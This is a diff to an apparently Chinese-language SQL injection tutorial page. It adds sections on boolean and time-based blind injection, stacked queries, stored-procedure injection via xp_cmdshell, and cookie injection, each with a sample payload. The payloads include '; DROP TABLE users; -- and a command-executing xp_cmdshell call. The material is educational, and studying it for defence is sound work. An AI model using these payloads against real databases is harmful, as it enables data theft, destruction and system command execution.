@@ -75,6 +75,15 @@ select xxoo into outfile &#39;路径&#39;：权限较高时可直接写文件
     <li><a href="#基本注入">基本注入</a></li>
     <li><a href="#union-注入"><code>UNION</code> 注入</a></li>
     <li><a href="#错误型注入">错误型注入</a></li>
+    <li><a href="#盲注布尔注入时间注入">盲注（布尔注入、时间注入）</a>
+      <ul>
+        <li><a href="#布尔注入">布尔注入</a></li>
+        <li><a href="#时间注入">时间注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#堆叠查询注入">堆叠查询注入</a></li>
+    <li><a href="#存储过程注入">存储过程注入</a></li>
+    <li><a href="#cookie-注入">Cookie 注入</a></li>
   </ul>
 </nav>
         </aside>
@@ -123,6 +132,32 @@ select xxoo into outfile &#39;路径&#39;：权限较高时可直接写文件
 <p>输入：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND 1=CONVERT(int, (SELECT @@version)) --
 </span></span></span></code></pre></div><p>可以通过报错获得数据库版本信息。</p>
+<h2 id="盲注布尔注入时间注入">盲注（布尔注入、时间注入）</h2>
+<h3 id="布尔注入">布尔注入</h3>
+<p>无法直接获取查询结果，攻击者通过判断返回页面的响应（如布尔值或时间延迟）来逐步推测数据。</p>
+<p>输入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (SELECT 1 WHERE SUBSTRING((SELECT database()), 1, 1)=&#39;</span>t<span style="color:#e6db74">&#39;) --
+</span></span></span></code></pre></div><p><code>SUBSTRING</code> 函数用于从字符串中提取子字符串,它接受三个参数：表达式、起始位置和长度，并返回指定部分的字符串。此语句根据返回结果判断数据库名首字母是否为 &ldquo;t&rdquo;。</p>
+<h3 id="时间注入">时间注入</h3>
+<p>输入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND IF(1=1, SLEEP(5), 0) --
+</span></span></span></code></pre></div><p>如果盲注成功，则等待 5 秒。</p>
+<h2 id="堆叠查询注入">堆叠查询注入</h2>
+<p>允许多条 SQL 语句同时执行。</p>
+<p>输入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;; DROP TABLE users; --
+</span></span></span></code></pre></div><p>这将导致 <code>users</code> 表被删除。某些数据库（如 MySQL）默认不支持多语句执行。</p>
+<h2 id="存储过程注入">存储过程注入</h2>
+<p>利用存储过程的输入参数注入恶意 SQL。</p>
+<p>输入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;; EXEC xp_cmdshell(&#39;</span>dir<span style="color:#e6db74">&#39;); --
+</span></span></span></code></pre></div><p>执行的语句：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> LoginProcedure <span style="color:#e6db74">&#39;username&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>; <span style="color:#66d9ef">EXEC</span> xp_cmdshell(<span style="color:#e6db74">&#39;dir&#39;</span>); <span style="color:#75715e">--&#39;
+</span></span></span></code></pre></div><p><code>EXEC</code> 用于执行动态 SQL 语句。此语句将执行系统命令（如列出目录）。</p>
+<h2 id="cookie-注入">Cookie 注入</h2>
+<p>利用修改浏览器存储的 Cookie 值进行注入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Cookie: session_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>;
+</span></span></code></pre></div><p>服务器在解析 Cookie 时执行了恶意 SQL。</p>
 
 </article>
 
